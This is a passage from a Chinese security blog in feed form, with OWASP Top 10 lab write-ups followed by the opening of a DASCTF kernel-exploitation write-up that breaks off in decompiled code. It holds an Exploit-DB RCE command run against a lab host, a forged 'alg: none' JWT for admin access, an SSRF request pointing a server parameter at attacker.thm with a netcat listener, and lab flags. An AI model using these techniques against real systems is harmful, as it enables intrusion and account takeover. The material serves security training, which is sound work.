redirect(url_for("index"))\n\n\nif __name__ == "__main__":\n    db.create_all()\n    app.run(host=\'0.0.0.0\', port=5000, debug=True)\n'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ul><h1 id="六、易受攻击或过时的组件"><a href="#六、易受攻击或过时的组件" class="headerlink" title="六、易受攻击或过时的组件"></a>六、易受攻击或过时的组件</h1><p>有时，您可能会发现您正在测试的公司&#x2F;实体正在使用具有众所周知漏洞的程序。</p><p>例如，假设一家公司已经几年没有更新其 WordPress 版本，并且使用 WPScan 等工具，您会发现它的版本是 4.6。一些快速研究表明 WordPress 4.6 容易受到未经身份验证的远程代码执行 (RCE) 漏洞的攻击，更好的是，您可以在 Exploit-DB 上找到已经存在的漏洞。</p><p>正如您所看到的，这将是相当具有破坏性的，因为攻击者只需要很少的工作。由于该漏洞已经众所周知，因此其他人可能已经利用了该漏洞。当您意识到这种情况很容易发生时，情况会变得更糟。如果一家公司错过了其使用的程序的一次更新，那么它可能容易受到任意数量的攻击。</p><p>所以，我们的主要工作是找出该软件的信息并进行研究，直到找到漏洞利用程序。让我们通过一个示例 Web 应用程序来完成这个过程。<br><img src="/PenTest_FILE/49eba25342587552308607ebdf8019b9_MD5.jpeg"><br>你知道什么？该服务器具有 Nostromo Web 服务器的默认页面。现在我们有了版本号和软件名称，我们可以使用 <a href="https://www.exploit-db.com/">Exploit-DB</a> 网站来尝试找到该特定版本的漏洞。<br><img src="/PenTest_FILE/8c90b8666d5d47d89a0597986278c5b5_MD5.jpeg"><br>幸运的是，最重要的结果恰好是一个漏洞利用脚本。让我们下载它并尝试执行代码。</p><p>您从互联网下载的漏洞第一次可能不起作用。你需要理解脚本所使用的编程语言，以便在需要时，您可以修复任何错误或进行任何修改，因为 Exploit-DB 上的很多脚本都不可能原封不动直接能够使用</p><h2 id="练习-5"><a href="#练习-5" class="headerlink" title="练习"></a>练习</h2><p>欢迎来到CSE网上书店，本网站是使用 PHP 和 MYSQL（程序函数）制作的！ 布局使用 Bootstrap 使其响应更快。 这只是一个简单的网站！<br><img src="/PenTest_FILE/f5b3b915203616be75a553351b977eca_MD5.jpeg"></p><p>我一开始的思路是这样：</p><blockquote><p>Bootstrap是一组用于网站和网络应用程序开发的开源前端框架，包括HTML、CSS及JavaScript的框架，提供字体排印、窗体、按钮、导航及其他各种组件及Javascript扩展，旨在使动态网页和Web应用的开发更加容易。</p></blockquote><blockquote><p>在 Bootstrap 中，从 2.3.0 版本开始，直到 3.4.0 版本之前，以及 4.x 版本在 4.1.2 版本之前，折叠组件的 data-parent 属性存在 XSS 漏洞。攻击者可以利用这个漏洞执行恶意的 JavaScript 代码。</p></blockquote><p>Bootstrap版本将显示在CSS文件的顶部。 只需打开它并查看文件的顶部。<br><img src="/PenTest_FILE/83bd1ae5422295c9c83154629310c35d_MD5.jpeg"><br><img src="/PenTest_FILE/d2599db0d3416b70d31ad8060cb43b05_MD5.jpeg"><br>居然是3.3.5的版本，存在XSS</p><p>但是这好像不能进行任意文件读取<br><img src="/PenTest_FILE/6922277e73dcc38538a65680bd5661cd_MD5.jpeg"></p><p>提示也不知道怎么用<br><img src="/PenTest_FILE/4bfeb09720fcfa26a5936873b82b53e2_MD5.jpeg"></p><p>wp使用了一个叫<code>searchsploit</code>的工具</p><blockquote><p>Searchsploit是一个用于Exploit-DB的命令行搜索工具，它还允许你随身带一份Exploit-DB的副本，SearchSploit为您提供了在本地保存的存储库中执行详细的离线搜索的能力。</p></blockquote><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">searchsploit online book store<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/PenTest_FILE/1637b9451dcdbaecbd79369dee074184_MD5.jpeg"></p><p>现在我们将使用漏洞利用 47887.py 在易受攻击的网站获取 rce（还真行啊）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 /usr/share/exploitdb/exploits/php/webapps/47887.py http://10.10.30.59:84/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/PenTest_FILE/661fae70e9ff05b0da40162c9d7384a5_MD5.jpeg"></p><ul><li>&#x2F;opt&#x2F;flag.txt 文件的内容是什么？答：THM{But_1ts_n0t_my_f4ult!}</li></ul><h1 id="七、身份验证缺陷"><a href="#七、身份验证缺陷" class="headerlink" title="七、身份验证缺陷"></a>七、身份验证缺陷</h1><p><strong>身份验证</strong> 和 <strong>会话管理</strong> 构成了现代 Web 应用程序的核心组件。身份验证允许用户通过验证其身份来访问 Web 应用程序。最常见的身份验证形式是使用用户名和密码机制。用户将输入这些凭据，服务器将验证它们。如果正确的话，服务器将向用户的浏览器提供会话 cookie。需要会话 cookie，因为 Web 服务器使用 HTTP(S) 进行通信，这是无状态的。附加会话 cookie 意味着服务器将知道谁正在发送什么数据。然后服务器可以跟踪用户的操作。</p><p>如果攻击者能够发现身份验证机制中的缺陷，他们可能会成功访问其他用户的帐户。这将允许攻击者访问敏感数据（取决于应用程序的目的）。身份验证机制中的一些常见缺陷包括：</p><ul><li>暴力攻击：如果 Web 应用程序使用用户名和密码，攻击者可以尝试发起暴力攻击，通过多次身份验证尝试来猜测用户名和密码。</li><li>使用弱凭据：Web 应用程序应设置强密码策略。如果应用程序允许用户设置“password1”等密码或常用密码，则攻击者可以轻松猜出它们并访问用户帐户。</li><li>弱会话 Cookie：会话 Cookie 是服务器跟踪用户的方式。如果会话 cookie 包含可预测的值，攻击者就可以设置自己的会话 cookie 并访问用户的帐户。</li></ul><p>当然，根据具体的缺陷，可以有多种针对损坏的身份验证机制的缓解措施：</p><ul><li>为了避免密码猜测攻击，请确保应用程序强制执行强大的密码策略。</li><li>为了避免暴力攻击，请确保应用程序在一定次数的尝试后强制执行自动锁定。这将防止攻击者发起更多暴力攻击。</li><li>实施多重身份验证。如果用户有多种身份验证方法，例如使用用户名和密码并在移动设备上接收代码，则攻击者将很难同时获取密码和代码来访问帐户。</li></ul><h2 id="现有用户重新注册"><a href="#现有用户重新注册" class="headerlink" title="现有用户重新注册"></a>现有用户重新注册</h2><p>对于此示例，我们将研究身份验证机制中的逻辑缺陷。</p><p>很多时候，开发人员忘记清理用户在应用程序代码中给出的输入（用户名和密码），这可能使他们容易受到 SQL 注入等攻击。然而，我们将重点关注一个由于开发人员的错误而发生但非常容易被利用的漏洞，即现有用户的重新注册。</p><p>让我们通过一个例子来理解这一点，假设有一个名为 <code>admin</code> 的现有用户，我们想要访问他的帐户，我们可以做的是尝试重新注册该用户名。</p><p>不过需要稍作修改。我们将输入<code> admin</code>（注意开头的空格）。现在，当您在用户名字段中输入该信息并输入其他必需信息（例如电子邮件 ID 或密码）并提交该数据时，它将注册一个新用户，但该用户将拥有与管理员帐户相同的权利。该新用户还可以查看用户 <code>admin</code> 下显示的所有内容。</p><h2 id="练习-6"><a href="#练习-6" class="headerlink" title="练习"></a>练习</h2><p>要查看实际效果，请访问 <a href="http://10.10.92.142:8088/">http://10.10.92.142:8088</a> 并尝试使用 <code>darren</code> 作为您的用户名进行注册。</p><p>我先使用<code>darren</code>用户名来进行注册，显示用户已存在：<br><img src="/PenTest_FILE/1d6efcaae9e72c5ba33fa2ebc16e39f2_MD5.jpeg"></p><p>使用<code> darren</code>注册<br><img src="/PenTest_FILE/ad8d726b3a49f144a18d90d1b13a6e12_MD5.jpeg"></p><ul><li>您在 darren 的帐户中找到的标志是什么？答：fe86079416a21a3c99937fea8874b667</li><li>现在尝试执行相同的操作，看看您是否可以以 Arthur 身份登录。你在亚瑟的账户中找到的旗帜是什么？答：<br>d9ac0f7db4fda460ac3edeb75d75e16e</li></ul><h1 id="八、数据完整性"><a href="#八、数据完整性" class="headerlink" title="八、数据完整性"></a>八、数据完整性</h1><p>当谈论完整性时，我们指的是我们必须确定一段数据未被修改的能力。完整性对于网络安全至关重要，因为我们关心维护重要数据免受不必要或恶意的修改。例如，假设您正在下载某个应用程序的最新安装程序。您如何确定下载时它没有在传输过程中被修改或因传输错误而被损坏？</p><p>为了解决这个问题，您经常会看到与文件一起发送的哈希值，以便您可以证明您下载的文件保持其完整性并且在传输过程中没有被修改。哈希或摘要只是对一段数据应用特定算法所产生的数字。在阅读有关哈希算法的内容时，您经常会阅读有关 MD5、SHA1、SHA256 或许多其他可用算法的内容。</p><p>此漏洞是由使用软件或数据而不使用任何类型的完整性检查的代码或基础设施引起的。由于没有进行完整性验证，攻击者可能会修改传递给应用程序的软件或数据，从而导致意外后果。</p><h2 id="软件完整性故障"><a href="#软件完整性故障" class="headerlink" title="软件完整性故障"></a>软件完整性故障</h2><p>假设您有一个网站，该网站使用第三方库，这些库存储在一些不受您控制的外部服务器中。</p><p>虽然这听起来有点奇怪，但这实际上是一种常见的做法。以常用的 javascript 库 jQuery 为例。如果需要，您可以直接从他们的服务器将 jQuery 添加到您的网站中，而无需实际下载它，只需在网站的 HTML 代码中添加以下行：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.6.1.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当用户导航到您的网站时，其浏览器将读取其 HTML 代码并从指定的外部源下载 jQuery。<br><img src="/PenTest_FILE/fe9220009f8327a05a8de266d28dc98e_MD5.jpeg"></p><p>问题是，如果攻击者以某种方式侵入 jQuery 官方存储库，他们可以更改 <code>https://code.jquery.com/jquery-3.6.1.min.js</code> 的内容以注入恶意代码。因此，任何访问您网站的人现在都会提取恶意代码并在不知不觉中将其执行到浏览器中。这是软件完整性故障，因为您的网站没有检查第三方库以查看它是否已更改。现代浏览器允许您沿着库的 URL 指定哈希，以便仅当下载文件的哈希与预期值匹配时才执行库代码。这种安全机制称为子资源完整性 (SRI)</p><p>正确做法是在 HTML 代码中插入库的正确方法是使用 SRI 并包含完整性哈希，这样，如果攻击者能够以某种方式修改库，则任何浏览您网站的客户端都不会执行修改后的版本。 HTML 中的内容应如下所示：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://code.jquery.com/jquery-3.6.1.min.js<span class="token punctuation">"</span></span> <span class="token attr-name">integrity</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sha256-o88AwQnZB+VDvE9tvIXrMQaPlFFSUTR+nldQm1LuPXQ=<span class="token punctuation">"</span></span> <span class="token attr-name">crossorigin</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>anonymous<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>您可以访问<a href="https://www.srihash.org/">SRI Hash Generator</a>，能够自动生成任何库的正确的插入库html代码。</p><h2 id="练习-7"><a href="#练习-7" class="headerlink" title="练习"></a>练习</h2><ul><li><a href="https://code.jquery.com/jquery-1.12.4.min.js">https://code.jquery.com/jquery-1.12.4.min.js</a> 的 SHA-256 哈希值是什么？答：sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ&#x3D;</li></ul><h2 id="数据完整性故障"><a href="#数据完整性故障" class="headerlink" title="数据完整性故障"></a>数据完整性故障</h2><p>让我们考虑一下 Web 应用程序如何维护会话。通常，当用户登录应用程序时，他们将被分配某种会话令牌，只要会话持续，就需要将其保存在浏览器上。此令牌将在每个后续请求中重复，以便 Web 应用程序知道我们是谁。这些会话令牌可以有多种形式，但通常通过 cookie 分配。 <code>Cookie</code> 是网络应用程序将存储在用户浏览器上的键值对，并且会在每次向发出它们的网站发出请求时自动重复。</p><p>例如，如果您正在创建一个网络邮件应用程序，则可以在登录后为每个用户分配一个包含用户名的 cookie。在后续请求中，您的浏览器始终会在 cookie 中发送您的用户名，以便您的 Web 应用程序知道哪个用户正在连接。从安全角度来看，这将是一个糟糕的想法，因为正如我们提到的，cookie 存储在用户的浏览器上，因此如果用户篡改 cookie 并更改用户名，他们可能会冒充其他人并阅读他们的电子邮件！该应用程序将遭受数据完整性故障，因为它信任攻击者可以篡改的数据。</p><p>解决此问题的一种方法是使用某种完整性机制来保证 cookie 没有被用户更改。为了避免重新造轮子，我们可以使用一些令牌实现来允许您执行此操作并处理所有密码学以提供完整性证明，而无需您费心。 <code>JSON Web Tokens (JWT) </code>就是这样的一种实现。</p><p>JWT 是非常简单的令牌，允许您在令牌上存储键值对，并作为令牌的一部分提供完整性。这个想法是，您可以生成令牌，您可以向用户提供这些令牌，确保他们无法更改键值对并通过完整性检查。 JWT 令牌的结构由 3 部分组成：<br><img src="/PenTest_FILE/ba2bad5f7c22ab8d464ce84ab5b29df7_MD5.jpeg"></p><ul><li>header：标头包含指示这是 JWT 的元数据，并且使用的签名算法是 HS256</li><li>payload：有效负载包含键值对以及 Web 应用程序希望客户端存储的数据。</li><li>signature：签名类似于哈希，用于验证payload的完整性。</li></ul><p>⚠请注意，令牌的 3 个部分中的每一个部分都是使用 Base64 编码的简单明文。您可以使用此在线工具对 Base64 进行编码&#x2F;解码。尝试解码以下令牌的标头和有效负载（注意：签名包含二进制数据，所以即使你解码它，你也无法理解它的意义。）：<br>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNjY1MDc2ODM2fQ.C8Z3gJ7wPgVLvEUonaieJWBJBYt5xOph2CpIhlxqdUw<br><img src="/PenTest_FILE/3a3f9f2357e08f821cc23172b024206c_MD5.jpeg"></p><h2 id="练习-8"><a href="#练习-8" class="headerlink" title="练习"></a>练习</h2><p>不久前，一些实现 JWT 的库存在数据完整性失败漏洞。正如我们所看到的，JWT 实现了签名来验证有效负载数据的完整性。但是易受攻击的库允许攻击者通过同时更改 JWT 中的以下两项来绕过签名验证：</p><ol><li>修改令牌的header部分，以便 alg 标头包含值 none 。</li><li>修改payload部分，使 username 标头为我们的目标用户名。</li><li>删除签名部分。</li></ol><p>以之前的 JWT 为例，如果我们想更改payload，使用户名变为“admin”且不进行签名检查，我们必须解码标头和payload。修改它们，然后将它们编码回来。<br><img src="/PenTest_FILE/8814b0cd759d04544e9091734e581a4c_MD5.jpeg"><br>⚠请注意我们虽然删除了签名部分，但保留了末尾的点。</p><ul><li><p>尝试以访客身份登录应用程序。客人的账户密码是什么？答：guest<br><img src="/PenTest_FILE/ad04caaddfd77f8bb04dd96a00eda6a3_MD5.jpeg"></p></li><li><p>包含 JWT 令牌的网站 cookie 的名称是什么？答：jwt-session<br>在登录guest:guest用户后被设置了cookie<br><img src="/PenTest_FILE/9929af92448db8bf9009020fa98bf565_MD5.jpeg"></p></li><li><p>使用在此任务中获得的知识来修改 JWT 令牌，以便应用程序认为您是用户“admin”。向管理员用户显示的标志是什么？答：THM{Dont_take_cookies_from_strangers}</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzEwNzY0NDQ4fQ.Yw2DrhzPMR9dEW4H9rV0qTEEqcS98_JTUQNF3VUs-Sc改为eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzEwNzY0NDQ4fQ==.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h1 id="九、安全日志与监控失败"><a href="#九、安全日志与监控失败" class="headerlink" title="九、安全日志与监控失败"></a>九、安全日志与监控失败</h1><p>设置 Web 应用程序时，应记录用户执行的每个操作。日志记录很重要，因为一旦发生事件，可以追踪攻击者的活动。一旦追踪他们的行为，就可以确定他们的风险和影响。如果没有日志记录，就无法知道攻击者在获得对特定 Web 应用程序的访问权限时执行了哪些操作。这些更显着的影响包括：</p><ul><li>监管损害：如果攻击者获得了对用户个人身份信息的访问权限，并且没有相关记录，则最终用户会受到影响，并且应用程序所有者可能会根据法规受到罚款或更严厉的处罚。</li><li>进一步攻击的风险：如果不进行日志记录，可能无法检测到攻击者的存在。这可能允许攻击者通过窃取凭据、攻击基础设施等方式对 Web 应用程序所有者发起进一步的攻击。</li></ul><p>日志中存储的信息应包括以下内容：</p><ul><li>HTTP 状态代码</li><li>时间戳</li><li>用户名</li><li>API端点&#x2F;页面位置</li><li>IP地址</li></ul><p>这些日志包含一些敏感信息，因此确保它们的安全存储以及这些日志的多个副本存储在不同位置非常重要。</p><p>您可能已经注意到，在发生违规或事件后，日志记录变得更加重要。理想的情况是进行监控以检测任何可疑活动。检测这种可疑活动的目的是完全阻止攻击者，或者如果检测到攻击者的存在比预期晚得多，则可以减少他们造成的影响。可疑活动的常见示例包。</p><h2 id="练习-9"><a href="#练习-9" class="headerlink" title="练习"></a>练习</h2><p>示例日志文件如下：</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">200 OK           12.55.22.88 jr22          2019-03-18T09:21:17 /login200 OK           14.56.23.11 rand99        2019-03-18T10:19:22 /login200 OK           17.33.10.38 afer11        2019-03-18T11:11:44 /login200 OK           99.12.44.20 rad4          2019-03-18T11:55:51 /login200 OK           67.34.22.10 bff1          2019-03-18T13:08:59 /login200 OK           34.55.11.14 hax0r         2019-03-21T16:08:15 /login401 Unauthorised 49.99.13.16 admin         2019-03-21T21:08:15 /login401 Unauthorised 49.99.13.16 administrator 2019-03-21T21:08:20 /login401 Unauthorised 49.99.13.16 anonymous     2019-03-21T21:08:25 /login401 Unauthorised 49.99.13.16 root          2019-03-21T21:08:30 /login <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>攻击者使用什么 IP 地址？答：49.99.13.16</p></li><li><p>正在进行什么样的攻击？答：brute force<br>这看起来像是一种暴力攻击，其中运行了不同的用户名&#x2F;密码组合。</p></li></ul><h1 id="十、服务器端请求伪造"><a href="#十、服务器端请求伪造" class="headerlink" title="十、服务器端请求伪造"></a>十、服务器端请求伪造</h1><p>当攻击者可以强制 Web 应用程序代表他们向任意目的地发送请求，同时控制请求本身的内容时，就会出现这种类型的漏洞。 SSRF 漏洞通常源于我们的 Web 应用程序需要使用第三方服务的实现。</p><p>例如，考虑一个使用外部 API 向其客户端发送 SMS 通知的 Web 应用程序。对于每封电子邮件，网站都需要向 SMS 提供商的服务器发出 Web 请求，以发送要发送的消息内容。由于 SMS 提供商按消息收费，因此他们要求您为您向其 API 发出的每个请求添加他们预先分配给您的密钥。 API 密钥充当身份验证令牌，并允许提供商知道向谁计费每条消息。该应用程序将像这样工作：<br><img src="/PenTest_FILE/a88de69b44ccdd2f6282a8f9d1b43d82_MD5.jpeg"></p><p>通过查看上图，很容易看出漏洞所在。应用程序向用户公开 <code>server</code> 参数，该参数定义 SMS 服务提供商的服务器名称。如果攻击者愿意，他们可以简单地更改 <code>server</code> 的值以指向他们控制的计算机，并且您的 Web 应用程序会很乐意将 SMS 请求转发给攻击者而不是 SMS 提供商。作为转发消息的一部分，攻击者将获取 API 密钥，从而允许他们使用 SMS 服务发送消息，费用由您承担。为此，攻击者只需向您的网站发出以下请求：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">https://www.mysite.com/sms?server=attacker.thm&amp;msg=ABC<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这将使易受攻击的 Web 应用程序发出请求：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup">https://attacker.thm/api/send?msg=ABC <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后您可以使用 Netcat 捕获请求的内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">user@attackbox$ <span class="token function">nc</span> <span class="token parameter variable">-lvp</span> <span class="token number">80</span>Listening on <span class="token number">0.0</span>.0.0 <span class="token number">80</span>Connection received on <span class="token number">10.10</span>.1.236 <span class="token number">43830</span>GET /:8087/public-docs/123.pdf HTTP/1.1Host: <span class="token number">10.10</span>.10.11User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0Accept: */*<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><p>这是 SSRF 的一个非常基本的案例。如果这看起来没有那么可怕，那么 SSRF 实际上可以用来做更多的事情。一般来说，根据每个场景的具体情况，SSRF 可用于：</p><ul><li>枚举内部网络，包括 IP 地址和端口。</li><li>滥用服务器之间的信任关系并获取对其他受限服务的访问权限。</li><li>与一些非 HTTP 服务交互以获取远程代码执行 (RCE)。</li></ul><h2 id="练习-10"><a href="#练习-10" class="headerlink" title="练习"></a>练习</h2><ul><li><p>探索网站。唯一允许访问管理区域的主机是什么？答：admin<br><img src="/PenTest_FILE/e236617dc4c5be801bd210ee5726d936_MD5.jpeg"></p></li><li><p>检查“下载简历”按钮。服务器参数指向哪里？答：secure-file-storage.com<br><img src="/PenTest_FILE/c81a6a402e31ff37fc114f6679d1d880_MD5.jpeg"></p></li><li><p>使用 SSRF，使应用程序将请求发送到 AttackBox，而不是安全文件存储。拦截的请求中是否有API密钥？答：THM{Hello_Im_just_an_API_key}</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 进攻性渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF2023六月挑战赛 二进制专场 DASKERNEL</title>
      <link href="/2024/03/15/DASCTF2023%E5%85%AD%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E5%9C%BA%20DASKERNEL/"/>
      <url>/2024/03/15/DASCTF2023%E5%85%AD%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B%20%E4%BA%8C%E8%BF%9B%E5%88%B6%E4%B8%93%E5%9C%BA%20DASKERNEL/</url>
      
        <content type="html"><![CDATA[<blockquote><p>ezkernel! have fun!</p></blockquote><p>记得这道kernel pwn的wp给当时刚学堆的我带来了不小的震撼</p><h1 id="一、逆向分析"><a href="#一、逆向分析" class="headerlink" title="一、逆向分析"></a>一、逆向分析</h1><h2 id="boot-sh"><a href="#boot-sh" class="headerlink" title="boot.sh"></a>boot.sh</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>  <span class="token parameter variable">-m</span> 256M <span class="token punctuation">\</span>  <span class="token parameter variable">-kernel</span> ./bzImage <span class="token punctuation">\</span>  <span class="token parameter variable">-initrd</span> ./rootfs.cpio <span class="token punctuation">\</span>  <span class="token parameter variable">-append</span> <span class="token string">"root=/dev/ram rw console=ttyS0 oops=panic panic=1 nokaslr pti=on quiet"</span> <span class="token punctuation">\</span>  <span class="token parameter variable">-cpu</span> kvm64,+smep <span class="token punctuation">\</span>  <span class="token parameter variable">-net</span> user <span class="token parameter variable">-net</span> nic <span class="token parameter variable">-device</span> e1000 <span class="token punctuation">\</span>  <span class="token parameter variable">-smp</span> <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">2</span>,threads<span class="token operator">=</span><span class="token number">2</span> <span class="token punctuation">\</span>  <span class="token parameter variable">-monitor</span> /dev/null <span class="token punctuation">\</span>  <span class="token parameter variable">-nographic</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>开了smep和pti，注意没有kaslr</p><h2 id="init"><a href="#init" class="headerlink" title="init"></a>init</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs none /sys<span class="token function">mount</span> <span class="token parameter variable">-t</span> devtmpfs devtmpfs /dev<span class="token function">mount</span> <span class="token parameter variable">-t</span> tmpfs tmpfs /tmp/sbin/mdev <span class="token parameter variable">-s</span><span class="token function">mkdir</span> <span class="token parameter variable">-p</span> /dev/pts<span class="token function">mount</span> <span class="token parameter variable">-vt</span> devpts <span class="token parameter variable">-o</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">4</span>,mode<span class="token operator">=</span><span class="token number">620</span> none /dev/pts<span class="token function">chmod</span> <span class="token number">666</span> /dev/ptmx<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">0</span>&lt;</span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">1</span>></span>/dev/console<span class="token builtin class-name">exec</span> <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/console<span class="token function">ifup</span> eth0 <span class="token operator">></span>/dev/null <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span class="token builtin class-name">echo</span> <span class="token number">2</span> <span class="token operator">></span> /proc/sys/kernel/kptr_restrict<span class="token builtin class-name">echo</span> <span class="token number">1</span> <span class="token operator">></span> /proc/sys/kernel/dmesg_restrict<span class="token function">chown</span> root:root flag<span class="token function">chmod</span> <span class="token number">400</span> flaginsmod /DASKERNEL.ko<span class="token function">chmod</span> <span class="token number">777</span> /proc/DASKERNEL<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span><span class="token function">cat</span> /welcomesetsid cttyhack setuidgid <span class="token number">1000</span> <span class="token function">sh</span><span class="token comment">#setsid cttyhack setuidgid 0 sh</span><span class="token function">umount</span> /proc<span class="token function">umount</span> /syspoweroff <span class="token parameter variable">-d</span> <span class="token number">0</span> <span class="token parameter variable">-f</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="DASKERNEL-ko"><a href="#DASKERNEL-ko" class="headerlink" title="DASKERNEL.ko"></a>DASKERNEL.ko</h2><h3 id="init-module"><a href="#init-module" class="headerlink" title="init_module"></a>init_module</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">init_module</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  babyLinkedList_file_entry <span class="token operator">=</span> <span class="token punctuation">(</span>proc_dir_entry <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">proc_create</span><span class="token punctuation">(</span><span class="token string">"DASKERNEL"</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>babyLinkedList_file_fops<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> babyLinkedList_file_entry <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">babyLinkedList_init_cold</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">else</span>    <span class="token keyword">return</span> <span class="token number">4294967284LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>创建了一个虚拟文件节点 DASKERNEL</p><h3 id="babyLinkedList-ioctl"><a href="#babyLinkedList-ioctl" class="headerlink" title="babyLinkedList_ioctl"></a>babyLinkedList_ioctl</h3><p>有效的选项就两个</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">babyLinkedList_ioctl</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 cmd<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token class-name">uint64_t</span> <span class="token operator">*</span>req<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token class-name">uint64_t</span> <span class="token operator">*</span>v3<span class="token punctuation">;</span> <span class="token comment">// rbx</span>  LinkedList <span class="token operator">*</span>LinkedList<span class="token punctuation">;</span> <span class="token comment">// r12</span>  LinkedList <span class="token operator">*</span>v5<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token class-name">uint64_t</span> v6<span class="token punctuation">;</span> <span class="token comment">// rdi</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token class-name">uint64_t</span> v8<span class="token punctuation">;</span> <span class="token comment">// rsi</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// r12</span>  LinkedList <span class="token operator">*</span>v11<span class="token punctuation">;</span> <span class="token comment">// r13</span>  <span class="token function">_fentry__</span><span class="token punctuation">(</span>a1<span class="token 